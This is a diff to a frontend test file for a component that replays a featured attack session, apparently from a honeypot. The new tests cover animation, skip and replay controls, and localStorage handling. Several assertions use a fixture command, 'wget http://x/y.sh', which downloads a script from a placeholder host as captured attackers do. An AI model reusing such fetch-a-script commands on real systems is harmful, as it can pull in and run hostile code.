@@ -267,6 +267,9 @@ describe("FeaturedAttack", () => {
   };
   // Without this the stub leaks into every test that runs afterwards.
   afterEach(() => { window.matchMedia = realMatchMedia; });
+  // "Already watched" is persisted, so without clearing it the first test to
+  // render would silently suppress the animation in every later one.
+  beforeEach(() => window.localStorage.clear());
 
   it("stands down quietly when there is no session to show", () => {
     // /sessions/featured 404s on a quiet week. That is not an error worth
@@ -323,6 +326,51 @@ describe("FeaturedAttack", () => {
       events: [{ timestamp: "2026-08-16T10:00:00Z", command: "ls", username: null, password: null }],
     }} />);
     expect(screen.getByText("ls")).toBeInTheDocument();
+  });
+
+  it("animates on a first visit", () => {
+    render(<FeaturedAttack {...props} />);
+    // Mid-playback: the closing marker only appears once the replay finishes.
+    expect(screen.queryByText(/session ended/)).toBeNull();
+    expect(screen.getByRole("button", { name: /pause/i })).toBeInTheDocument();
+  });
+
+  it("shows the finished transcript immediately on a repeat visit", () => {
+    // The annoyance this exists to fix: watching the same typing animation
+    // every single time you open the page.
+    window.localStorage.setItem("hunajapannu:replayed-session", "abc123");
+    render(<FeaturedAttack {...props} />);
+    expect(screen.getByText("wget http://x/y.sh")).toBeInTheDocument();
+    expect(screen.getByText(/session ended/)).toBeInTheDocument();
+    expect(screen.getByRole("button", { name: /replay/i })).toBeInTheDocument();
+  });
+
+  it("animates again when a genuinely different session is featured", () => {
+    window.localStorage.setItem("hunajapannu:replayed-session", "some-older-session");
+    render(<FeaturedAttack {...props} />);
+    expect(screen.queryByText(/session ended/)).toBeNull();
+  });
+
+  it("records the session so the next visit does not replay it", () => {
+    render(<FeaturedAttack {...props} />);
+    expect(window.localStorage.getItem("hunajapannu:replayed-session")).toBe("abc123");
+  });
+
+  it("can be skipped to the end mid-playback", () => {
+    render(<FeaturedAttack {...props} />);
+    fireEvent.click(screen.getByRole("button", { name: /skip/i }));
+    expect(screen.getByText("wget http://x/y.sh")).toBeInTheDocument();
+    expect(screen.getByText(/session ended/)).toBeInTheDocument();
+    expect(screen.queryByRole("button", { name: /skip/i })).toBeNull();
+  });
+
+  it("still renders when localStorage throws (private mode)", () => {
+    const spy = vi.spyOn(Storage.prototype, "getItem").mockImplementation(() => {
+      throw new Error("denied");
+    });
+    expect(() => render(<FeaturedAttack {...props} />)).not.toThrow();
+    expect(screen.getByText(/1\.2\.3\.4/)).toBeInTheDocument();
+    spy.mockRestore();
   });
 
   it("collapses events ingested more than once", () => {
